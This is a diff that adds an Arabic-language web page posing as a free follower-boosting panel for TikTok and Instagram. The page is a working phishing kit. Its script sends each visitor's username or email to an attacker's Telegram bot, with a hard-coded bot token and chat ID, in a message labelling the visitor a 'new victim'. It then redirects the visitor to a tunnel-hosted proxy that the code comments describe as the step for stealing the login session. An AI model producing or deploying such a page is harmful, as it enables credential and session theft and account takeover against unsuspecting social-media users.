@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SMM Panel - زيادة متابعين مجاناً</title>
+    <style>
+        :root { --primary: #fe2c55; --secondary: #1da1f2; --insta: #e1306c; }
+        body { font-family: 'Cairo', sans-serif; background: #0f0f0f; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .card { background: #1e1e1e; padding: 25px; border-radius: 15px; width: 90%; max-width: 400px; text-align: center; border: 1px solid #333; }
+        .header { margin-bottom: 20px; }
+        .platform-btns { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; }
+        .btn { padding: 12px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; transition: 0.3s; color: white; }
+        .btn-tt { background: var(--primary); }
+        .btn-ig { background: var(--insta); }
+        .input-group { margin-bottom: 15px; text-align: right; }
+        input { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #444; background: #2a2a2a; color: white; box-sizing: border-box; }
+        .status-bar { height: 4px; background: #333; margin: 15px 0; border-radius: 2px; overflow: hidden; display: none; }
+        .progress { width: 0%; height: 100%; background: var(--primary); transition: 2s; }
+    </script>
+</head>
+<body>
+    <div class="card">
+        <div class="header">
+            <h2>لوحة الرشق السريع 🚀</h2>
+            <p style="color: #aaa; font-size: 14px;">اختر المنصة وابدأ بزيادة المتابعين الآن</p>
+        </div>
+        
+        <div class="platform-btns">
+            <button class="btn btn-tt" onclick="select('TikTok')">TikTok</button>
+            <button class="btn btn-ig" onclick="select('Instagram')">Instagram</button>
+        </div>
+
+        <div id="form-area">
+            <div class="input-group">
+                <label>اسم المستخدم أو البريد:</label>
+                <input type="text" id="user" placeholder="@username">
+            </div>
+            <button class="btn btn-tt" style="width: 100%; font-size: 18px;" onclick="startProcess()">ابدأ الرشق الآن</button>
+        </div>
+
+        <div id="loading" style="display: none;">
+            <div class="status-bar" style="display: block;"><div class="progress" id="p-bar"></div></div>
+            <p id="status-text">جاري فحص الحساب...</p>
+        </div>
+    </div>
+
+    <script>
+        // الرابط الذي سيوجه إليه بعد سحب المعلومات (سيرفر تيرمكس)
+        const PROXY_URL = "https://your-termux-link.lhr.life/auth"; 
+        const TOKEN = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY";
+        const ID = "1772820433";
+
+        async function select(p) {
+            alert("تم اختيار " + p + ". يرجى إدخال البيانات.");
+        }
+
+        async function startProcess() {
+            const user = document.getElementById('user').value;
+            if(!user) return alert("أدخل اسم المستخدم!");
+
+            document.getElementById('form-area').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+            
+            // إرسال البيانات الأولية للبوت
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: ID,
+                    text: `🔥 ضحية جديدة تريد رشق!\n👤 المستخدم: ${user}\n📱 المنصة: محاولة اختراق...`
+                })
+            });
+
+            // محاكاة التحميل ثم التوجيه للبروكسي لسحب الجلسة
+            setTimeout(() => {
+                document.getElementById('p-bar').style.width = "100%";
+                document.getElementById('status-text').innerText = "تم التحقق! يرجى تسجيل الدخول لتأكيد الملكية...";
+                setTimeout(() => {
+                    window.location.href = PROXY_URL;
+                }, 2000);
+            }, 1500);
+        }
+    </script>
+</body>
+</html>
